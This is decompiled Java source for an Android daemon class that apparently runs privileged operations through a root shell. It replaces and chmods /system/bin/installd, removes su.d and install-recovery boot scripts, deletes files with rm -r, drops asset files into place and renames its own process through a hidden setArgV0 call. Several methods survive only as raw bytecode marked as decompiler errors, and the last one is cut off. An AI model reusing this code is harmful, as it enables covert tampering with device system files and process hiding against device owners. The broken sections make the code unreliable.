package com.fx.daemon;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.ConditionVariable;
import android.os.SystemClock;
import com.fx.daemon.exception.RunningException;
import com.fx.daemon.util.e;
import com.vvt.io.p;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.LinuxFile;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;

public class b
{
  public static final String a = p.a("/system/su.d", "0000adam.sh");
  private static boolean b = com.vvt.ak.a.a;
  private static boolean c = com.vvt.ak.a.e;
  
  public static String a(String paramString1, String paramString2)
  {
    Object localObject1 = null;
    boolean bool1 = true;
    Object localObject2 = LinuxFile.a(paramString2, bool1);
    boolean bool2 = false;
    Iterator localIterator = ((ArrayList)localObject2).iterator();
    localObject2 = null;
    boolean bool3;
    do
    {
      do
      {
        bool3 = localIterator.hasNext();
        if (!bool3) {
          break;
        }
        localObject2 = ((LinuxFile)localIterator.next()).d();
        String str = ".apk";
        bool3 = ((String)localObject2).endsWith(str);
      } while (!bool3);
      bool3 = ((String)localObject2).startsWith(paramString1);
    } while (!bool3);
    bool2 = b;
    if (bool2) {}
    for (;;)
    {
      if (bool1) {
        localObject1 = localObject2;
      }
      return (String)localObject1;
      bool1 = false;
    }
  }
  
  public static void a()
  {
    int i = 1;
    boolean bool1 = b;
    if (bool1) {}
    f localf = f.b();
    String str1 = localf.a("/system/bin/ls /system/bin/installd.o");
    Object localObject;
    boolean bool2;
    String str2;
    if (str1 != null)
    {
      localObject = "No such file or directory";
      bool2 = str1.contains((CharSequence)localObject);
      if (!bool2)
      {
        int j = 2;
        localObject = new Object[j];
        localObject[0] = "/system/bin/installd.o";
        localObject[i] = "/system/bin/installd";
        str1 = String.format("mv %s %s", (Object[])localObject);
        localf.a(str1);
        localObject = new Object[i];
        str2 = "/system/bin/installd";
        localObject[0] = str2;
        str1 = String.format("chmod 755 %s", (Object[])localObject);
        localf.a(str1);
        long l = 500L;
        SystemClock.sleep(l);
        bool2 = com.vvt.ad.a.a();
        if (bool2)
        {
          localObject = new Object[i];
          str2 = "/system/bin/installd";
          localObject[0] = str2;
          str1 = String.format("restorecon %s", (Object[])localObject);
          localf.a(str1);
        }
        bool2 = b;
        if (!bool2) {}
      }
    }
    str1 = localf.a("/system/bin/ls /system/su.d");
    if (str1 != null)
    {
      localObject = "No such file or directory";
      bool2 = str1.contains((CharSequence)localObject);
      if (!bool2)
      {
        localObject = new Object[i];
        str2 = a;
        localObject[0] = str2;
        str1 = String.format("rm %s ", (Object[])localObject);
        localf.a(str1);
        bool2 = b;
        if (!bool2) {}
      }
    }
    str1 = localf.a("/system/bin/ls /system/etc/install-recovery-2.sh");
    if (str1 != null)
    {
      localObject = "No such file or directory";
      bool2 = str1.contains((CharSequence)localObject);
      if (!bool2)
      {
        localObject = new Object[i];
        str2 = "/system/etc/install-recovery-2.sh";
        localObject[0] = str2;
        str1 = String.format("rm %s ", (Object[])localObject);
        localf.a(str1);
        bool2 = b;
        if (!bool2) {}
      }
    }
    localf.d();
    bool1 = b;
    if (bool1) {}
  }
  
  /* Error */
  public static void a(Context paramContext)
  {
    // Byte code:
    //   0: aload_0
    //   1: ldc 126
    //   3: invokevirtual 132	android/content/Context:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
    //   6: checkcast 134	android/os/PowerManager
    //   9: astore_1
    //   10: getstatic 15	com/fx/daemon/removeFromPath:removeFromPath	Z
    //   13: istore_2
    //   14: iload_2
    //   15: ifeq +3 -> 18
    //   18: ldc -120
    //   20: astore_3
    //   21: aload_3
    //   22: invokestatic 142	java/lang/Class:forName	(Ljava/lang/String;)Ljava/lang/Class;
    //   25: astore_3
    //   26: getstatic 15	com/fx/daemon/removeFromPath:removeFromPath	Z
    //   29: istore 4
    //   31: iload 4
    //   33: ifeq +3 -> 36
    //   36: ldc -112
    //   38: astore 5
    //   40: iconst_1
    //   41: istore 6
    //   43: iload 6
    //   45: anewarray 138	java/lang/Class
    //   48: astore 7
    //   50: aconst_null
    //   51: astore 8
    //   53: ldc 61
    //   55: astore 9
    //   57: aload 7
    //   59: iconst_0
    //   60: aload 9
    //   62: aastore
    //   63: aload_3
    //   64: aload 5
    //   66: aload 7
    //   68: invokevirtual 148	java/lang/Class:getDeclaredMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   71: astore_3
    //   72: iconst_1
    //   73: istore 4
    //   75: aload_3
    //   76: iload 4
    //   78: invokevirtual 154	java/lang/reflect/Method:setAccessible	(Z)V
    //   81: getstatic 15	com/fx/daemon/removeFromPath:removeFromPath	Z
    //   84: istore 4
    //   86: iload 4
    //   88: ifeq +3 -> 91
    //   91: iconst_1
    //   92: istore 4
    //   94: iload 4
    //   96: anewarray 4	java/lang/Object
    //   99: astore 5
    //   101: iconst_0
    //   102: istore 6
    //   104: aconst_null
    //   105: astore 7
    //   107: ldc -100
    //   109: astore 8
    //   111: aload 5
    //   113: iconst_0
    //   114: aload 8
    //   116: aastore
    //   117: aload_3
    //   118: aload_1
    //   119: aload 5
    //   121: invokevirtual 160	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   124: pop
    //   125: invokestatic 73	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   128: astore_1
    //   129: ldc -94
    //   131: astore_3
    //   132: aload_1
    //   133: aload_3
    //   134: invokevirtual 78	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   137: pop
    //   138: ldc -112
    //   140: astore_3
    //   141: aload_1
    //   142: aload_3
    //   143: invokevirtual 78	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   146: pop
    //   147: aload_1
    //   148: invokevirtual 124	com/vvt/shell/f:d	()V
    //   151: return
    //   152: astore_1
    //   153: getstatic 20	com/fx/daemon/removeFromPath:MyUncaughtExceptionHandler	Z
    //   156: istore 10
    //   158: iload 10
    //   160: ifeq -35 -> 125
    //   163: goto -38 -> 125
    //   166: astore_1
    //   167: getstatic 20	com/fx/daemon/removeFromPath:MyUncaughtExceptionHandler	Z
    //   170: istore 10
    //   172: iload 10
    //   174: ifeq -23 -> 151
    //   177: goto -26 -> 151
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	180	0	paramContext	Context
    //   9	139	1	localObject1	Object
    //   152	1	1	localException	Exception
    //   166	1	1	localCannotGetRootShellException	CannotGetRootShellException
    //   13	2	2	bool1	boolean
    //   20	123	3	localObject2	Object
    //   29	66	4	bool2	boolean
    //   38	82	5	localObject3	Object
    //   41	62	6	i	int
    //   48	58	7	arrayOfClass	Class[]
    //   51	64	8	str	String
    //   55	6	9	localClass	Class
    //   156	17	10	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   10	13	152	java/lang/Exception
    //   21	25	152	java/lang/Exception
    //   26	29	152	java/lang/Exception
    //   43	48	152	java/lang/Exception
    //   60	63	152	java/lang/Exception
    //   66	71	152	java/lang/Exception
    //   76	81	152	java/lang/Exception
    //   81	84	152	java/lang/Exception
    //   94	99	152	java/lang/Exception
    //   114	117	152	java/lang/Exception
    //   119	125	152	java/lang/Exception
    //   125	128	166	com/vvt/shell/CannotGetRootShellException
    //   133	138	166	com/vvt/shell/CannotGetRootShellException
    //   142	147	166	com/vvt/shell/CannotGetRootShellException
    //   147	151	166	com/vvt/shell/CannotGetRootShellException
  }
  
  /* Error */
  public static void a(android.content.res.AssetManager paramAssetManager, String paramString1, String paramString2, String paramString3, String paramString4)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 5
    //   3: aconst_null
    //   4: astore 6
    //   6: iconst_2
    //   7: istore 7
    //   9: iconst_1
    //   10: istore 8
    //   12: iload 7
    //   14: anewarray 4	java/lang/Object
    //   17: astore 9
    //   19: aload 9
    //   21: iconst_0
    //   22: aload_1
    //   23: aastore
    //   24: aload 9
    //   26: iload 8
    //   28: aload 4
    //   30: aastore
    //   31: ldc -88
    //   33: aload 9
    //   35: invokestatic 95	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   38: astore 10
    //   40: ldc -88
    //   42: astore 9
    //   44: iload 7
    //   46: anewarray 4	java/lang/Object
    //   49: astore 11
    //   51: aload 11
    //   53: iconst_0
    //   54: aload_2
    //   55: aastore
    //   56: aload 11
    //   58: iload 8
    //   60: aload 4
    //   62: aastore
    //   63: aload 9
    //   65: aload 11
    //   67: invokestatic 95	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   70: astore 11
    //   72: new 170	java/io/File
    //   75: astore 12
    //   77: aload 12
    //   79: aload 11
    //   81: invokespecial 174	java/io/File:<init>	(Ljava/lang/String;)V
    //   84: aload 12
    //   86: invokevirtual 177	java/io/File:exists	()Z
    //   89: istore 13
    //   91: iload 13
    //   93: ifne +77 -> 170
    //   96: getstatic 15	com/fx/daemon/removeFromPath:removeFromPath	Z
    //   99: istore 13
    //   101: iload 13
    //   103: ifeq +3 -> 106
    //   106: aload_0
    //   107: aload 10
    //   109: invokevirtual 183	android/content/res/AssetManager:open	(Ljava/lang/String;)Ljava/io/InputStream;
    //   112: astore 9
    //   114: new 185	java/io/FileOutputStream
    //   117: astore 10
    //   119: aload 10
    //   121: aload 12
    //   123: iconst_0
    //   124: invokespecial 188	java/io/FileOutputStream:<init>	(Ljava/io/File;Z)V
    //   127: aload 9
    //   129: invokevirtual 194	java/io/InputStream:available	()I
    //   132: istore 5
    //   134: iload 5
    //   136: newarray <illegal type>
    //   138: astore 6
    //   140: aload 9
    //   142: aload 6
    //   144: invokevirtual 198	java/io/InputStream:read	([B)I
    //   147: pop
    //   148: aload 10
    //   150: aload 6
    //   152: invokevirtual 202	java/io/FileOutputStream:write	([B)V
    //   155: aload 10
    //   157: invokevirtual 205	java/io/FileOutputStream:flush	()V
    //   160: aload 9
    //   162: invokestatic 210	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   165: aload 10
    //   167: invokestatic 213	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   170: aload_2
    //   171: aload_3
    //   172: invokevirtual 216	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   175: istore 14
    //   177: iload 14
    //   179: ifne +91 -> 270
    //   182: new 39	java/util/ArrayList
    //   185: astore 10
    //   187: aload 10
    //   189: invokespecial 218	java/util/ArrayList:<init>	()V
    //   192: aload 10
    //   194: aload 4
    //   196: invokevirtual 222	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   199: pop
    //   200: getstatic 15	com/fx/daemon/removeFromPath:removeFromPath	Z
    //   203: istore 5
    //   205: iload 5
    //   207: ifeq +3 -> 210
    //   210: aload_2
    //   211: aload_3
    //   212: aload 10
    //   214: invokestatic 227	com/vvt/shell/ShellUtil:a	(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;)V
    //   217: return
    //   218: astore 10
    //   220: iconst_0
    //   221: istore 14
    //   223: aconst_null
    //   224: astore 10
    //   226: getstatic 20	com/fx/daemon/removeFromPath:MyUncaughtExceptionHandler	Z
    //   229: istore 13
    //   231: iload 13
    //   233: ifeq +3 -> 236
    //   236: aload 6
    //   238: invokestatic 210	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   241: aload 10
    //   243: invokestatic 213	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   246: goto -76 -> 170
    //   249: astore 10
    //   251: iconst_0
    //   252: istore 13
    //   254: aconst_null
    //   255: astore 9
    //   257: aload 9
    //   259: invokestatic 210	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   262: aload 6
    //   264: invokestatic 213	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   267: aload 10
    //   269: athrow
    //   270: invokestatic 229	com/vvt/shell/f:a	()Lcom/vvt/shell/f;
    //   273: astore 10
    //   275: iload 8
    //   277: anewarray 4	java/lang/Object
    //   280: astore 9
    //   282: aload 9
    //   284: iconst_0
    //   285: aload 11
    //   287: aastore
    //   288: ldc -25
    //   290: aload 9
    //   292: invokestatic 95	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   295: astore 6
    //   297: aload 10
    //   299: aload 6
    //   301: invokevirtual 78	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   304: pop
    //   305: aload 10
    //   307: invokevirtual 124	com/vvt/shell/f:d	()V
    //   310: goto -93 -> 217
    //   313: astore 10
    //   315: goto -58 -> 257
    //   318: astore 15
    //   320: aload 10
    //   322: astore 6
    //   324: aload 15
    //   326: astore 10
    //   328: goto -71 -> 257
    //   331: astore 15
    //   333: aload 6
    //   335: astore 9
    //   337: aload 10
    //   339: astore 6
    //   341: aload 15
    //   343: astore 10
    //   345: goto -88 -> 257
    //   348: astore 10
    //   350: iconst_0
    //   351: istore 14
    //   353: aconst_null
    //   354: astore 10
    //   356: aload 9
    //   358: astore 6
    //   360: goto -134 -> 226
    //   363: astore 6
    //   365: aload 9
    //   367: astore 6
    //   369: goto -143 -> 226
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	372	0	paramAssetManager	android.content.res.AssetManager
    //   0	372	1	paramString1	String
    //   0	372	2	paramString2	String
    //   0	372	3	paramString3	String
    //   0	372	4	paramString4	String
    //   1	134	5	i	int
    //   203	3	5	bool1	boolean
    //   4	355	6	localObject1	Object
    //   363	1	6	localException1	Exception
    //   367	1	6	localObject2	Object
    //   7	38	7	j	int
    //   10	266	8	k	int
    //   17	349	9	localObject3	Object
    //   38	175	10	localObject4	Object
    //   218	1	10	localException2	Exception
    //   224	18	10	localOutputStream	java.io.OutputStream
    //   249	19	10	localObject5	Object
    //   273	33	10	localf	f
    //   313	8	10	localObject6	Object
    //   326	18	10	localObject7	Object
    //   348	1	10	localException3	Exception
    //   354	1	10	localObject8	Object
    //   49	237	11	localObject9	Object
    //   75	47	12	localFile	File
    //   89	164	13	bool2	boolean
    //   175	177	14	bool3	boolean
    //   318	7	15	localObject10	Object
    //   331	11	15	localObject11	Object
    // Exception table:
    //   from	to	target	type
    //   107	112	218	java/lang/Exception
    //   107	112	249	finally
    //   114	117	313	finally
    //   123	127	313	finally
    //   127	132	318	finally
    //   134	138	318	finally
    //   142	148	318	finally
    //   150	155	318	finally
    //   155	160	318	finally
    //   226	229	331	finally
    //   114	117	348	java/lang/Exception
    //   123	127	348	java/lang/Exception
    //   127	132	363	java/lang/Exception
    //   134	138	363	java/lang/Exception
    //   142	148	363	java/lang/Exception
    //   150	155	363	java/lang/Exception
    //   155	160	363	java/lang/Exception
  }
  
  public static void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    ConditionVariable localConditionVariable = new android/os/ConditionVariable;
    localConditionVariable.<init>(false);
    e locale = new com/fx/daemon/util/e;
    locale.<init>(paramString, localConditionVariable);
    locale.start();
    localConditionVariable.block();
    bool = b;
    if (bool) {}
  }
  
  public static void a(String paramString1, String paramString2, String paramString3)
  {
    int i = 1;
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = new java/io/File;
    ((File)localObject1).<init>(paramString2);
    bool1 = ((File)localObject1).exists();
    if (!bool1)
    {
      bool1 = b;
      if (bool1) {}
      bool1 = false;
      localObject1 = null;
    }
    try
    {
      ShellUtil.a(paramString2, false);
      Object localObject2 = new Object[2];
      localObject2[0] = paramString2;
      localObject2[i] = paramString3;
      localObject1 = String.format("%s/%s", (Object[])localObject2);
      localObject2 = new java/io/File;
      ((File)localObject2).<init>((String)localObject1);
      boolean bool2 = ((File)localObject2).exists();
      if (!bool2)
      {
        bool2 = b;
        if (bool2) {}
        localObject2 = f.a();
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = localObject1;
        String str = String.format("echo \"\" >> %s", arrayOfObject);
        ((f)localObject2).a(str);
        str = "chmod 666 %s";
        arrayOfObject = new Object[i];
        arrayOfObject[0] = localObject1;
        localObject1 = String.format(str, arrayOfObject);
        ((f)localObject2).a((String)localObject1);
        ((f)localObject2).d();
      }
      com.vvt.t.a.a().a(paramString2, paramString3);
      localObject1 = com.vvt.t.a.a();
      int j = 6;
      ((com.vvt.t.a)localObject1).a(j);
      bool1 = b;
      if (bool1) {}
      return;
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
  }
  
  public static boolean a(String paramString, ContentResolver paramContentResolver, Uri paramUri, a parama, long paramLong)
  {
    boolean bool1 = b;
    if (bool1) {}
    try
    {
      Object localObject1 = new java/io/File;
      Object localObject2 = parama.c();
      ((File)localObject1).<init>((String)localObject2);
      bool1 = ((File)localObject1).exists();
      if (!bool1)
      {
        bool1 = b;
        if (bool1) {}
        parama.a();
      }
      localObject1 = new android/os/ConditionVariable;
      ((ConditionVariable)localObject1).<init>(false);
      localObject2 = new com/fx/daemon/util/a;
      ((com.fx.daemon.util.a)localObject2).<init>(paramContentResolver, paramUri, (ConditionVariable)localObject1);
      ((com.fx.daemon.util.a)localObject2).start();
      boolean bool2 = b;
      if (bool2) {}
      parama.e();
      bool2 = b;
      if (bool2) {}
      bool1 = ((ConditionVariable)localObject1).block(paramLong);
      bool2 = b;
      if (bool2) {}
      return bool1;
    }
    catch (Exception localException)
    {
      RunningException localRunningException = new com/fx/daemon/exception/RunningException;
      localRunningException.<init>("Startup script not found");
      throw localRunningException;
    }
  }
  
  public static boolean a(String paramString, ContentResolver paramContentResolver, Uri paramUri, a parama, long paramLong, String[] paramArrayOfString)
  {
    boolean bool1 = b;
    if (bool1) {}
    for (;;)
    {
      try
      {
        Object localObject1 = new java/io/File;
        Object localObject2 = parama.c();
        ((File)localObject1).<init>((String)localObject2);
        bool1 = ((File)localObject1).exists();
        if (!bool1)
        {
          bool1 = b;
          if (bool1) {}
          parama.a();
        }
        localObject1 = new android/os/ConditionVariable;
        ((ConditionVariable)localObject1).<init>(false);
        localObject2 = new com/fx/daemon/util/a;
        ((com.fx.daemon.util.a)localObject2).<init>(paramContentResolver, paramUri, (ConditionVariable)localObject1);
        ((com.fx.daemon.util.a)localObject2).start();
        boolean bool2 = b;
        if ((!bool2) || (paramArrayOfString != null))
        {
          parama.a(paramArrayOfString);
          bool2 = b;
          if (bool2) {}
          bool1 = ((ConditionVariable)localObject1).block(paramLong);
          bool2 = b;
          if (bool2) {}
          return bool1;
        }
      }
      catch (Exception localException)
      {
        RunningException localRunningException = new com/fx/daemon/exception/RunningException;
        localRunningException.<init>("Startup script not found");
        throw localRunningException;
      }
      parama.d();
    }
  }
  
  public static Context b()
  {
    boolean bool1 = false;
    Object localObject1 = "android.app.ActivityThread";
    try
    {
      Object localObject3 = Class.forName((String)localObject1);
      Object localObject4 = "systemMain";
      bool2 = false;
      localObject1 = null;
      localObject1 = (Class[])null;
      localObject4 = ((Class)localObject3).getDeclaredMethod((String)localObject4, null);
      bool2 = true;
      ((Method)localObject4).setAccessible(bool2);
      bool2 = false;
      localObject1 = null;
      localObject1 = (Object[])null;
      localObject1 = ((Method)localObject4).invoke(null, null);
      localObject4 = "mSystemContext";
      localObject3 = ((Class)localObject3).getDeclaredField((String)localObject4);
      boolean bool3 = true;
      ((Field)localObject3).setAccessible(bool3);
      localObject1 = ((Field)localObject3).get(localObject1);
      localObject1 = (Context)localObject1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (bool2) {}
        bool2 = false;
        Object localObject2 = null;
      }
    }
    bool1 = b;
    if (bool1) {}
    return (Context)localObject1;
  }
  
  public static ArrayList b(String paramString1, String paramString2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = true;
    Object localObject = LinuxFile.a(paramString2, bool1);
    Iterator localIterator = ((ArrayList)localObject).iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = ((LinuxFile)localIterator.next()).d();
      boolean bool2 = b;
      if (bool2) {}
      bool2 = ((String)localObject).startsWith(paramString1);
      if (bool2)
      {
        bool2 = b;
        if (bool2) {}
        localArrayList.add(localObject);
      }
    }
    return localArrayList;
  }
  
  public static void b(String paramString)
  {
    Object localObject1 = "android.os.Process";
    try
    {
      localObject1 = Class.forName((String)localObject1);
      localObject2 = "setArgV0";
      int i = 1;
      Object localObject3 = new Class[i];
      Class localClass = String.class;
      localObject3[0] = localClass;
      localObject1 = ((Class)localObject1).getMethod((String)localObject2, (Class[])localObject3);
      localObject2 = null;
      i = 1;
      localObject3 = new Object[i];
      localObject3[0] = paramString;
      ((Method)localObject1).invoke(null, (Object[])localObject3);
      return;
    }
    catch (ClassNotFoundException localClassNotFoundException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localClassNotFoundException);
      throw ((Throwable)localObject2);
    }
    catch (SecurityException localSecurityException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localSecurityException);
      throw ((Throwable)localObject2);
    }
    catch (NoSuchMethodException localNoSuchMethodException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localNoSuchMethodException);
      throw ((Throwable)localObject2);
    }
    catch (IllegalArgumentException localIllegalArgumentException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localIllegalArgumentException);
      throw ((Throwable)localObject2);
    }
    catch (IllegalAccessException localIllegalAccessException)
    {
      localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localIllegalAccessException);
      throw ((Throwable)localObject2);
    }
    catch (InvocationTargetException localInvocationTargetException)
    {
      Object localObject2 = new java/lang/RuntimeException;
      ((RuntimeException)localObject2).<init>(localInvocationTargetException);
      throw ((Throwable)localObject2);
    }
  }
  
  public static boolean b(String paramString, ContentResolver paramContentResolver, Uri paramUri, a parama, long paramLong)
  {
    return a(paramString, paramContentResolver, paramUri, parama, paramLong, null);
  }
  
  public static boolean c(String paramString)
  {
    String str = ".db";
    boolean bool = paramString.contains(str);
    if (!bool)
    {
      str = ".dat";
      bool = paramString.contains(str);
      if (!bool)
      {
        str = ".ref";
        bool = paramString.contains(str);
        if (!bool)
        {
          str = ".txt";
          bool = paramString.contains(str);
          if (!bool)
          {
            str = ".log";
            bool = paramString.contains(str);
            if (!bool) {
              break label74;
            }
          }
        }
      }
    }
    bool = true;
    for (;;)
    {
      return bool;
      label74:
      bool = false;
      str = null;
    }
  }
  
  public static void d(String paramString)
  {
    int i = 2;
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.t.a.a().a(i);
    File localFile = new java/io/File;
    localFile.<init>(paramString);
    String[] arrayOfString = localFile.list();
    bool1 = b;
    if ((!bool1) || (arrayOfString != null))
    {
      int j = arrayOfString.length;
      if (j > 0)
      {
        f localf = f.b();
        int k = arrayOfString.length;
        j = 0;
        localFile = null;
        while (j < k)
        {
          String str1 = arrayOfString[j];
          boolean bool3 = c(str1);
          if (!bool3)
          {
            String str2 = "rm %s/%s";
            Object[] arrayOfObject = new Object[i];
            arrayOfObject[0] = paramString;
            int m = 1;
            arrayOfObject[m] = str1;
            str1 = String.format(str2, arrayOfObject);
            bool3 = b;
            if (bool3) {}
            localf.a(str1);
          }
          j += 1;
        }
        localf.d();
      }
    }
    boolean bool2 = b;
    if (bool2) {}
  }
  
  public static void e(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = false;
    f localf = null;
    try
    {
      localf = f.b();
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;) {}
    }
    if (localf == null)
    {
      bool1 = c;
      if (!bool1) {}
    }
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return;
      boolean bool2 = b;
      if (bool2) {}
      int i = 1;
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = paramString;
      String str = String.format("rm -r %s", arrayOfObject);
      localf.a(str);
      localf.d();
    }
  }
  
  /* Error */
  public static String f(String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: getstatic 15	com/fx/daemon/removeFromPath:removeFromPath	Z
    //   7: istore_3
    //   8: iload_3
    //   9: ifeq +3 -> 12
    //   12: invokestatic 73	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   15: astore 4
    //   17: ldc -88
    //   19: astore 5
    //   21: iconst_2
    //   22: istore 6
    //   24: iload 6
    //   26: anewarray 4	java/lang/Object
    //   29: astore 7
    //   31: iconst_0
    //   32: istore 8
    //   34: aconst_null
    //   35: astore 9
    //   37: ldc_w 359
    //   40: astore 10
    //   42: aload 7
    //   44: iconst_0
    //   45: aload 10
    //   47: aastore
    //   48: iconst_1
    //   49: istore 8
    //   51: aload 7
    //   53: iload 8
    //   55: aload_0
    //   56: aastore
    //   57: aload 5
    //   59: aload 7
    //   61: invokestatic 95	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   64: astore 7
    //   66: new 39	java/util/ArrayList
    //   69: astore 5
    //   71: aload 5
    //   73: invokespecial 218	java/util/ArrayList:<init>	()V
    //   76: aload 5
    //   78: aload 7
    //   80: invokevirtual 222	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   83: pop
    //   84: new 361	java/lang/StringBuilder
    //   87: astore 9
    //   89: aload 9
    //   91: invokespecial 362	java/lang/StringBuilder:<init>	()V
    //   94: aload 9
    //   96: aload 7
    //   98: invokevirtual 366	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   101: astore 9
    //   103: ldc_w 368
    //   106: astore 10
    //   108: aload 9
    //   110: aload 10
    //   112: invokevirtual 366	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   115: astore 9
    //   117: aload 9
    //   119: invokevirtual 371	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   122: astore 9
    //   124: aload 5
    //   126: aload 9
    //   128: invokevirtual 222	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   131: pop
    //   132: new 361	java/lang/StringBuilder
    //   135: astore 9
    //   137: aload 9
    //   139: invokespecial 362	java/lang/StringBuilder:<init>	()V
    //   142: aload 9
    //   144: aload 7
    //   146: invokevirtual 366	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   149: astore 9
    //   151: ldc_w 373
    //   154: astore 10
    //   156: aload 9
    //   158: aload 10
    //   160: invokevirtual 366	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   163: astore 9
    //   165: aload 9
    //   167: invokevirtual 371	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   170: astore 9
    //   172: aload 5
    //   174: aload 9
    //   176: invokevirtual 222	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   179: pop
    //   180: aload 5
    //   182: invokevirtual 43	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   185: astore 9
    //   187: iconst_0
    //   188: istore_3
    //   189: aconst_null
    //   190: astore 5
    //   192: aload 9
    //   194: invokeinterface 49 1 0
    //   199: istore_1
    //   200: iload_1
    //   201: ifeq +80 -> 281
    //   204: aload 9
    //   206: invokeinterface 53 1 0
    //   211: astore_2
    //   212: aload_2
    //   213: checkcast 61	java/lang/String
    //   216: astore_2
    //   217: ldc_w 375
    //   220: astore 10
    //   222: iconst_2
    //   223: istore 11
    //   225: iload 11
    //   227: anewarray 4	java/lang/Object
    //   230: astore 12
    //   232: iconst_0
    //   233: istore 13
    //   235: aload 12
    //   237: iconst_0
    //   238: aload_2
    //   239: aastore
    //   240: iconst_1
    //   241: istore 13
    //   243: aload 12
    //   245: iload 13
    //   247: aload_2
    //   248: aastore
    //   249: aload 10
    //   251: aload 12
    //   253: invokestatic 95	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   256: astore_2
    //   257: getstatic 15	com/fx/daemon/removeFromPath:removeFromPath	Z
    //   260: istore 14
    //   262: iload 14
    //   264: ifeq +3 -> 267
    //   267: aload 4
    //   269: aload_2
    //   270: invokevirtual 78	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   273: pop
    //   274: aload 7
    //   276: astore 5
    //   278: goto -86 -> 192
    //   281: aload 4
    //   283: ifnull +85 -> 368
    //   286: aload 4
    //   288: invokevirtual 124	com/vvt/shell/f:d	()V
    //   291: aload 5
    //   293: astore_2
    //   294: getstatic 15	com/fx/daemon/removeFromPath:removeFromPath	Z
    //   297: istore_3
    //   298: iload_3
    //   299: ifeq +3 -> 302
    //   302: aload_2
    //   303: areturn
    //   304: astore 5
    //   306: iconst_0
    //   307: istore_3
    //   308: aconst_null
    //   309: astore 5
    //   311: aload 5
    //   313: ifnull -19 -> 294
    //   316: aload 5
    //   318: invokevirtual 124	com/vvt/shell/f:d	()V
    //   321: goto -27 -> 294
    //   324: astore 5
    //   326: aconst_null
    //   327: astore 4
    //   329: aload 5
    //   331: astore_2
    //   332: aload 4
    //   334: ifnull +8 -> 342
    //   337: aload 4
    //   339: invokevirtual 124	com/vvt/shell/f:d	()V
    //   342: aload_2
    //   343: athrow
    //   344: astore_2
    //   345: goto -13 -> 332
    //   348: astore 5
    //   350: aload 4
    //   352: astore 5
    //   354: goto -43 -> 311
    //   357: astore_2
    //   358: aload 5
    //   360: astore_2
    //   361: aload 4
    //   363: astore 5
    //   365: goto -54 -> 311
    //   368: aload 5
    //   370: astore_2
    //   371: goto -77 -> 294
    // Local variable table:
    //   start	length	slot	name	signature
